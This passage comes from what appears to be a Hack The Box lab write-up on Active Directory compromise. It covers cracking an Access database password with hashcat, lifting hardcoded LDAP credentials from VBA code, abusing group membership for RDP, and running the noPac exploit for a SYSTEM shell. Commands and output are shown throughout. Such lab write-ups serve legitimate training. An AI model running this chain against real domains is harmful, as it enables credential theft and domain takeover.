+staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235</code></pre><p>This generated a hash for me to crack</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat accdb.hash /usr/share/wordlists/rockyou.txt --user
+
+$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235:class08</code></pre><p>Cracked the hash now i should be able to access the file</p><h3>VBS script found in .accdb file</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Option Compare Database
+
+Sub ImportStaffUsersFromLDAP()
+    Dim objConnection As Object
+    Dim objCommand As Object
+    Dim objRecordset As Object
+    Dim strLDAP As String
+    Dim strUser As String
+    Dim strPassword As String
+    Dim strSQL As String
+    Dim db As Database
+    Dim rst As Recordset
+    
+    strLDAP = &quot;LDAP://OU=staff,DC=retro2,DC=vl&quot;
+    strUser = &quot;retro2\ldapreader&quot;
+    strPassword = &quot;ppYaVcB5R&quot;
+    
+    Set objConnection = CreateObject(&quot;ADODB.Connection&quot;)
+    
+    objConnection.Provider = &quot;ADsDSOObject&quot;
+    objConnection.Properties(&quot;User ID&quot;) = strUser
+    objConnection.Properties(&quot;Password&quot;) = strPassword
+    objConnection.Properties(&quot;Encrypt Password&quot;) = True
+    objConnection.Open &quot;Active Directory Provider&quot;
+    
+    Set objCommand = CreateObject(&quot;ADODB.Command&quot;)
+    objCommand.ActiveConnection = objConnection
+    
+    objCommand.CommandText = &quot;&lt;&quot; &amp; strLDAP &amp; &quot;&gt;;(objectCategory=person);cn,distinguishedName,givenName,sn,sAMAccountName,userPrincipalName,description;subtree&quot;
+    
+    Set objRecordset = objCommand.Execute
+    
+    Set db = CurrentDb
+    Set rst = db.OpenRecordset(&quot;StaffMembers&quot;, dbOpenDynaset)
+    
+    Do Until objRecordset.EOF
+        rst.AddNew
+        rst!CN = objRecordset.Fields(&quot;cn&quot;).Value
+        rst!DistinguishedName = objRecordset.Fields(&quot;distinguishedName&quot;).Value
+        rst!GivenName = Nz(objRecordset.Fields(&quot;givenName&quot;).Value, &quot;&quot;)
+        rst!SN = Nz(objRecordset.Fields(&quot;sn&quot;).Value, &quot;&quot;)
+        rst!sAMAccountName = objRecordset.Fields(&quot;sAMAccountName&quot;).Value
+        rst!UserPrincipalName = Nz(objRecordset.Fields(&quot;userPrincipalName&quot;).Value, &quot;&quot;)
+        rst!Description = Nz(objRecordset.Fields(&quot;description&quot;).Value, &quot;&quot;)
+        rst.Update
+        
+        objRecordset.MoveNext
+    Loop
+    
+    rst.Close
+    objRecordset.Close
+    objConnection.Close
+    Set rst = Nothing
+    Set objRecordset = Nothing
+    Set objCommand = Nothing
+    Set objConnection = Nothing
+    
+    MsgBox &quot;Staff users imported successfully!&quot;, vbInformation
+End Sub</code></pre><p>As seen from this output there is credentials for a user account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb bln01.retro2.vl -u &#39;ldapreader&#39; -p &#39;ppYaVcB5R&#39;
+SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.12.5     445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R</code></pre><p>This user has been compromised and with this user account i should be able to use <code>admws01$</code> to add this user to the services group, the user will then inherit RDP rights since the services group is a member of remote desktop users</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">net rpc group addmem &quot;services&quot; &quot;ldapreader&quot; -U &quot;retro2.vl&quot;/&quot;admws01$&quot;%&#39;dmuhackers123!&#39; -S &quot;10.129.12.5&quot;</code></pre><p>This added the user <code>ldapreader</code> to the services group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">net rpc group members &quot;services&quot; -U &quot;retro2.vl&quot;/&quot;admws01$&quot;%&#39;dmuhackers123!&#39; -S &quot;10.129.12.5&quot; 
+RETRO2\ADMWS01$
+RETRO2\inventory
+RETRO2\ldapreader</code></pre><p>So now i should be able to RDP</p><p><img src="images/retrotwo/pasted-image-20260406002754.webp" alt="Screenshot" loading="lazy" /></p><h2>Domain admin</h2><p>Now i have access over RDP i can look for priv esc vectors</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb bln01.retro2.vl -u &#39;ldapreader&#39; -p &#39;ppYaVcB5R&#39; -M nopac                                
+SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.12.5     445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R 
+NOPAC       10.129.12.5     445    BLN01            TGT with PAC size 1435
+NOPAC       10.129.12.5     445    BLN01            TGT without PAC size 694
+NOPAC       10.129.12.5     445    BLN01            
+NOPAC       10.129.12.5     445    BLN01            VULNERABLE
+NOPAC       10.129.12.5     445    BLN01            Next step: https://github.com/Ridter/noPac</code></pre><p>Looks like its vulnerable to noPac</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 noPac.py retro2.vl/ldapreader:ppYaVcB5R -dc-ip 10.129.12.5 -dc-host BLN01 -shell --impersonate administrator -use-ldap
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target BLN01.retro2.vl
+[*] will try to impersonate administrator
+[*] Adding Computer Account &quot;WIN-VPN43YUE8B9$&quot;
+[*] MachineAccount &quot;WIN-VPN43YUE8B9$&quot; password = (*lmZyZdvEqe
+[*] Successfully added machine account WIN-VPN43YUE8B9$ with password (*lmZyZdvEqe.
+[*] WIN-VPN43YUE8B9$ object = CN=WIN-VPN43YUE8B9,CN=Computers,DC=retro2,DC=vl
+[*] WIN-VPN43YUE8B9$ sAMAccountName == BLN01
+[*] Saving a DC&#39;s ticket in BLN01.ccache
+[*] Reseting the machine account to WIN-VPN43YUE8B9$
+[*] Restored WIN-VPN43YUE8B9$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating administrator
+[*] 	Requesting S4U2self
+[*] Saving a user&#39;s ticket in administrator.ccache
+[*] Rename ccache to administrator_BLN01.retro2.vl.ccache
+[*] Attempting to del a computer with the name: WIN-VPN43YUE8B9$
+[-] Delete computer WIN-VPN43YUE8B9$ Failed! Maybe the current user does not have permission.
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Windows\system32&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
+SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeTcbPrivilege                  Act as part of the operating system       Enabled 
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Enabled 
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled 
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
+SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeAuditPrivilege                Generate security audits                  Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
+SeTimeZonePrivilege             Change the time zone                      Enabled 
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 
+
+C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt
+
+C:\Windows\system32&gt;</code></pre><p>Domain admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-redelegate/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Redelegate</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-sauna/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Sauna</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
